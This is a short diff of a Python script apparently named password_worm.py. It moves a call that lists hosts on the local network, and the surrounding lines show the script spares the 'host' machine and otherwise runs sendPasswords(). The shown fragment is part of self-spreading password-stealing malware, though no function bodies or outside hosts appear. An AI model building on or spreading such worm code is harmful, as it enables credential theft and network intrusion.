@@ -133,6 +133,8 @@ markSystem();
 
 wormLocation = "/tmp/password_worm.py"
 
+network = getHostsOnTheSameNetwork()
+
 if len(sys.argv) >= 2:
 	if sys.argv[1] == "-host":
 		print("This is the host computer will not steal passwords from this computer!")
@@ -144,7 +146,7 @@ if len(sys.argv) >= 2:
 else:
 	sendPasswords()
 
-network = getHostsOnTheSameNetwork()
+
 
 print network
 
